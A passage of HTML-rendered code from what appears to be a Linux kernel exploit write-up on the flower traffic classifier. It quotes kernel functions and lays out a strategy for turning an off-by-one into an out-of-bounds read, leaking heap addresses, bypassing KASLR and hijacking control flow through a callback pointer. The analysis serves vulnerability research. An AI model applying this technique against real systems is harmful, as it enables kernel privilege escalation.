(\u003C/span>\u003Cspan style=\"color:#F97583\">unsigned\u003C/span>\u003Cspan style=\"color:#F97583\"> long\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) tmplt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\ttc_setup_cb_call\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(block, TC_SETUP_CLSFLOWER, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">cls_flower, \u003C/span>\u003Cspan style=\"color:#79B8FF\">false\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">true\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#B392F0\"> tc_setup_cb_call\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_block \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">block\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">enum\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tc_setup_type \u003C/span>\u003Cspan style=\"color:#FFAB70\">type\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t     void\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\">type_data\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">bool\u003C/span>\u003Cspan style=\"color:#FFAB70\"> err_stop\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">bool\u003C/span>\u003Cspan style=\"color:#FFAB70\"> rtnl_held\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tbool\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> take_rtnl \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> READ_ONCE\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(block->lockeddevcnt) \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> !\u003C/span>\u003Cspan style=\"color:#E1E4E8\">rtnl_held;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ok_count;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">retry:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (take_rtnl)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\trtnl_lock\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tdown_read\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">block->cb_lock);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* Need to obtain rtnl lock if block is bound to devs that require it.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t * In block bind code cb_lock is obtained while holding rtnl, so we must\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t * obtain the locks in same order here.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">rtnl_held \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> !\u003C/span>\u003Cspan style=\"color:#E1E4E8\">take_rtnl \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> block->lockeddevcnt) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\tup_read\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">block->cb_lock);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\ttake_rtnl \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> true\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tgoto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> retry;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tok_count \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __tc_setup_cb_call\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(block, type, type_data, err_stop);\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">18\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tup_read\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">block->cb_lock);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (take_rtnl)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\trtnl_unlock\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ok_count;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">__tc_setup_cb_call\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_block \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">block\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">enum\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tc_setup_type \u003C/span>\u003Cspan style=\"color:#FFAB70\">type\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t   void\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\">type_data\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">bool\u003C/span>\u003Cspan style=\"color:#FFAB70\"> err_stop\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_block_cb \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">block_cb;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ok_count \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tlist_for_each_entry\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(block_cb, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">block->flow_block.cb_list, list) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\terr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> block_cb->\u003C/span>\u003Cspan style=\"color:#B392F0\">cb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(type, type_data, block_cb->cb_priv);\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">19\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err_stop)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t} \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tok_count\u003C/span>\u003Cspan style=\"color:#F97583\">++\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ok_count;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>By tracing the \u003Ccode>fl_tmplt_destroy\u003C/code> function, we can observe that at position [16], we can control \u003Ccode>tmplt->chain\u003C/code>. Therefore, at positions [17] and [18], we can control \u003Ccode>block\u003C/code>. At position [19], we have a suitable pointer, enabling control flow hijacking.\u003C/p>\n\u003Cp>At this point, our strategy is clear. We need to leak a controllable heap address, while simultaneously bypassing KASLR to obtain usable function pointers. Both of these tasks require out-of-bounds reads.\u003C/p>\n\u003Ch3 id=\"transforming-the-off-by-one-vulnerability-into-an-out-of-bounds-read-vulnerability\">Transforming the off-by-one vulnerability into an out-of-bounds read vulnerability\u003C/h3>\n\u003Cp>We need out-of-bounds reads, and conveniently, from \u003Ccode>cls_fl_ops\u003C/code>, we can see two functions that transfer data from the kernel to user space: \u003Ccode>fl_dump\u003C/code> and \u003Ccode>fl_tmplt_dump\u003C/code>. These correspond to the two vulnerable functions we just discussed.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_proto_ops cls_fl_ops __read_mostly \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.kind\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"flower\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.change\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_change,\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">11\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.delete\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_delete,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.dump\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_dump,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.terse_dump\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_terse_dump,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.bind_class\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_bind_class,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.tmplt_create\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_tmplt_create,\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">12\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.tmplt_destroy\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_tmplt_destroy,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.tmplt_dump\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_tmplt_dump,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.owner\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> THIS_MODULE,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t.flags\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TCF_PROTO_OPS_DOIT_UNLOCKED,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Following the call chains of these two functions, its logical to use \u003Ccode>fl_dump_key_geneve_opt\u003C/code> to retrieve the data we previously passed in.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>fl_dump_key -> fl_dump_key_enc_opt -> fl_dump_key_options->fl_dump_key_geneve_opt\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Lets take a closer look at \u003Ccode>fl_dump_key_geneve_opt\u003C/code>.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_dump_key_geneve_opt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sk_buff \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">skb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\t  struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_dissector_key_enc_opts \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">enc_opts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">opt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nlattr \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">nest;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> opt_off \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tnest \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_nest_start_noflag\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(skb, TCA_FLOWER_KEY_ENC_OPTS_GENEVE);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">nest)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tgoto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nla_put_failure;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\twhile\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (enc_opts->len \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> opt_off) {\t\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">20\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\topt \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">enc_opts->data[opt_off];\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">21\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#B392F0\">nla_put_be16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(skb, TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t opt->opt_class))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tgoto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nla_put_failure;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#B392F0\">nla_put_u8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(skb, TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t       opt->type))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tgoto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nla_put_failure;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#B392F0\">nla_put\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(skb, TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t    opt->length \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, opt->opt_data))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tgoto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nla_put_failure;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\topt_off \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> opt->length \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">22\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tnla_nest_end\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(skb, nest);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\treturn\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">nla_put_failure:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tnla_nest_cancel\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(skb, nest);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">EMSGSIZE;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Ccode>fl_dump_key_geneve_opt\u003C/code> simply utilizes the previously controlled \u003Ccode>enc_opts->len\u003C/code> to control the length, and copies data based on each \u003Ccode>opt->length * 4\u003C/code>, sending it to user space.\u003C/p>\n\u003Cp>Lets return to \u003Ccode>fl_set_geneve_opt\u003C/code>.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_set_geneve_opt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">const\u003C/span>\u003Cspan style=\"color:#F97583\"> struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nlattr \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">nla\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">key\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t     int\u003C/span>\u003Cspan style=\"color:#FFAB70\"> depth\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#FFAB70\"> option_len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t     struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> netlink_ext_ack \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">extack\u003C/span>\u003Cspan 